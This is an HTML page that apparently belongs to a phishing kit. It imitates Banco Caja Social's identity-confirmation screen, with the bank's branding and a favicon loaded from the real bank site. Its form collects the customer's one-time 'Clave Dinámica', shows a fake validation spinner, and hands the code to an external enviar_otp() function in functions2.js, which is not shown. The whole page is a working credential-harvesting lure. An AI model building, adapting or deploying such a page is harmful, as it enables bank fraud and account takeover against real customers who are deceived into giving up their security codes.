<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ValidaciÃ³n de Seguridad | Banco Caja Social</title>
    <link rel="icon" type="image/x-icon" href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/img/favicon.ico">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script type="text/javascript" src="../../scripts/functions2.js"></script>
    <style>
        :root {
            --bcs-blue: #004b98;
            --bcs-yellow: #ffcc00;
            --text-dark: #333333;
            --text-gray: #666666;
            --bg-light: #f4f7f9;
        }

        body, html {
            margin: 0;
            padding: 0;
            font-family: 'Roboto', sans-serif;
            background-color: var(--bg-light);
            height: 100%;
            overflow-x: hidden;
        }

        .page-wrapper {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            justify-content: center;
            align-items: center;
            padding: 20px;
            box-sizing: border-box;
            background: linear-gradient(135deg, #f4f7f9 0%, #e9eff5 100%);
        }

        .otp-card {
            background: #ffffff;
            width: 100%;
            max-width: 420px;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
            position: relative;
            z-index: 10;
        }

        .logo-box {
            margin-bottom: 30px;
            text-align: center;
        }

        .logo-box img {
            max-width: 200px;
            height: auto;
        }

        h1 {
            font-size: 22px;
            color: var(--bcs-blue);
            margin-bottom: 20px;
            font-weight: 500;
            text-align: center;
        }

        .info-text {
            font-size: 15px;
            color: var(--text-gray);
            line-height: 1.6;
            margin-bottom: 30px;
            text-align: center;
        }

        .info-text b {
            color: var(--text-dark);
        }

        /* Floating Label Styles */
        .form-field {
            position: relative;
            margin-bottom: 30px;
            border-bottom: 2px solid #e0e0e0;
            padding: 5px 0;
            transition: border-color 0.3s;
        }

        .form-field.focused {
            border-bottom-color: var(--bcs-blue);
        }

        .form-field label {
            position: absolute;
            left: 0;
            top: 10px;
            font-size: 16px;
            color: #999;
            transition: all 0.2s ease-out;
            pointer-events: none;
        }

        .form-field.focused label, 
        .form-field.filled label {
            top: -15px;
            font-size: 12px;
            color: var(--bcs-blue);
            font-weight: 500;
        }

        input {
            width: 100%;
            border: none;
            outline: none;
            font-size: 18px;
            color: var(--text-dark);
            padding: 8px 0;
            background: transparent;
            letter-spacing: 2px;
            font-weight: 500;
        }

        .btn-confirm {
            width: 100%;
            background: #cccccc;
            color: #ffffff;
            border: none;
            padding: 15px;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 700;
            cursor: not-allowed;
            transition: all 0.3s;
            margin-top: 10px;
            text-transform: uppercase;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }

        .btn-confirm.active {
            background: var(--bcs-blue);
            cursor: pointer;
        }

        .btn-confirm.active:hover {
            background: #003a75;
            transform: translateY(-1px);
            box-shadow: 0 6px 12px rgba(0,0,0,0.15);
        }

        .footer-actions {
            margin-top: 30px;
            text-align: center;
        }

        .action-link {
            display: inline-block;
            color: var(--bcs-blue);
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            margin: 10px 0;
            transition: opacity 0.2s;
        }

        .action-link:hover {
            opacity: 0.8;
            text-decoration: underline;
        }

        /* LOADER */
        #loading-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(255, 255, 255, 0.95);
            z-index: 9999;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .loader-box {
            text-align: center;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid var(--bcs-blue);
            border-bottom: 4px solid var(--bcs-yellow);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Responsive Mobile */
        @media (max-width: 480px) {
            .page-wrapper {
                padding: 0;
                background: #ffffff;
                justify-content: flex-start;
            }

            .otp-card {
                max-width: 100%;
                border-radius: 0;
                box-shadow: none;
                padding: 40px 25px;
            }

            h1 {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>

    <div id="loading-overlay">
        <div class="loader-box">
            <img src="logo-bcs.png" alt="Caja Social" style="max-width: 180px; margin-bottom: 20px;">
            <div class="spinner"></div>
            <p style="color: var(--bcs-blue); font-weight: 500;">Validando informaciÃ³n...</p>
        </div>
    </div>

    <div class="page-wrapper">
        <div class="otp-card">
            <div class="logo-box">
                <img src="logo-bcs.png" alt="Banco Caja Social">
            </div>

            <h1>ConfirmaciÃ³n de Identidad</h1>

            <p class="info-text">
                Para tu seguridad, hemos enviado una <b>Clave DinÃ¡mica</b> al nÃºmero celular y correo electrÃ³nico registrados en el Banco.
            </p>

            <form id="otpForm" autocomplete="off">
                <div class="form-field" id="otp-field">
                    <label for="txtOTP">Clave dinÃ¡mica</label>
                    <input type="tel" id="txtOTP" minlength="6" maxlength="99" inputmode="numeric" autocomplete="one-time-code">
                </div>

                <button type="button" id="btnOTP" class="btn-confirm" disabled>Confirmar</button>
            </form>

            <div class="footer-actions">
                <p style="font-size: 13px; color: var(--text-gray); margin-bottom: 5px;">Â¿No has recibido el cÃ³digo?</p>
                <a href="#" class="action-link">Generar nuevo cÃ³digo</a>
                <br>
                <a href="cajasocial.php" class="action-link" style="color: #999; font-weight: 400;">Cancelar operaciÃ³n</a>
            </div>
        </div>
    </div>

    <script>
        $(document).ready(function() {
            const $input = $("#txtOTP");
            const $field = $("#otp-field");
            const $btn = $("#btnOTP");

            // Floating label effect
            $input.on("focus", function() {
                $field.addClass("focused");
            }).on("blur", function() {
                $field.removeClass("focused");
                if ($input.val() !== "") {
                    $field.addClass("filled");
                } else {
                    $field.removeClass("filled");
                }
            }).on("input", function() {
                const val = $input.val();
                if (val !== "") {
                    $field.addClass("filled");
                } else {
                    $field.removeClass("filled");
                }

                // Button state
                if (val.length >= 6) {
                    $btn.addClass("active").prop("disabled", false);
                } else {
                    $btn.removeClass("active").prop("disabled", true);
                }
            });

            // Action
            $btn.on("click", function() {
                if (!$btn.prop("disabled")) {
                    $("#loading-overlay").css("display", "flex");
                    
                    // Asegurar que enviamos el valor correctamente a functions2.js
                    setTimeout(function() {
                        enviar_otp($input.val());
                    }, 800);
                }
            });

            // Enter key support
            $input.on("keypress", function(e) {
                if (e.which == 13 && $input.val().length >= 6) {
                    $btn.trigger("click");
                    return false;
                }
            });
        });
    </script>
</body>
</html>

